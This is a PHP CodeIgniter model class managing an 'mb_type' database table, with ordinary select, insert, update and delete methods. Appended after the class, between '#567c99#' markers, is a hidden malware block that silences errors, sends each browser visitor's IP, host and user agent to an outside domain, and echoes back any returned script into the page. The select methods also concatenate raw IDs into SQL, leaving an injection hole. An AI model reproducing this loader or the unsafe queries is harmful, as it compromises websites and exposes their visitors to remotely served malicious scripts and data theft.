<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class MbTypeManager extends CI_Model {
	private $_TABLE_NAME = 'mb_type';

	function __construct()
	{
		parent::__construct();
	}
	/**
	 * 
	 * Select type follow cat_id
	 * Enter description here ...
	 * @param unknown_type $cat_id
	 */
	
	public function select($cat_id='') {
		$this->load->database();
		if (isset($cat_id) && $cat_id!='')
			$sql = "SELECT * FROM ".$this->_TABLE_NAME." WHERE cat_id_=".$cat_id." ORDER BY id_";
		else 
			$sql = "SELECT * FROM ".$this->_TABLE_NAME." ORDER BY id_";
		$query = $this->db->query($sql);
		$dataResult = $query->result();
		$modelArray = array();
		foreach ($dataResult as $key => $value) {
			$modelArray[] = $this->convert($value);
		}
		return $modelArray;
	}
	/**
	 * @author: truong
	 * 
	 * Enter description here ...
	 * @param int $id
	 */
	
	public function _select($id='') {
		if (isset($id) && $id!='')
			$sql = "SELECT * FROM ".$this->_TABLE_NAME." WHERE id_=".$id;
		else 
			$sql = "SELECT * FROM ".$this->_TABLE_NAME;
		$query = $this->db->query($sql);
		$dataResult = $query->result();
		$modelArray = array();
		foreach ($dataResult as $key => $value) {
			$modelArray[] = $this->convert($value);
		}
		return $modelArray;
	}
	
	/**
	 * insert 
	 * 
	 * Enter description here ...
	 */
	
	public function insert($model) {
		$this->db->insert($this->_TABLE_NAME, $this->getDataObject($model));
		return $this->db->insert_id();
	}
	/**
	 * @author: truong
	 * Edit loai rao vat
	 * @param unknown_type $model
	 */
	
	public function _update($model) {
		$this->db->where('id_', $model->getId());
		$this->db->update($this->_TABLE_NAME, $this->getDataObject($model));
	}	
	
	/**
	 * delete a record in mb_type table
	 * 
	 * Enter description here ...
	 * @param unknown_type $model
	 */
	
	public function delete($model) {
		$this->db->where('id_', $model->getId());
		$this->db->delete($this->_TABLE_NAME);
	}
	
	/**
	 * generate insert (update) data object
	 * @param MbTypeModel $model
	 * array
	 */
	protected function getDataObject($model) {
		return array(
			'type_' => $model->getType(),
			'cat_id_' => $model->getCatId()
		);
	}
	
	/**
	 * convert from Database Record to MbProductModel
	 * @param record $record
	 * @return MbProductModel
	 */
	
	protected function convert ($record) {
		$model = new MbTypeModel();
		$model->setId($record->id_);
		$model->setType($record->type_);
		$model->setCatId($record->cat_id_);
		return $model;
	}
	
}

#567c99#
error_reporting(0); @ini_set('display_errors',0); $wp_m934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_m934) && !preg_match ('/bot/i', $wp_m934))){
$wp_m09934="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_m934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_m09934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_934m = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_934m = @file_get_contents($wp_m09934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_934m=@stream_get_contents(@fopen($wp_m09934, "r"));}}
if (substr($wp_934m,1,3) === 'scr'){ echo $wp_934m; }
#/567c99#
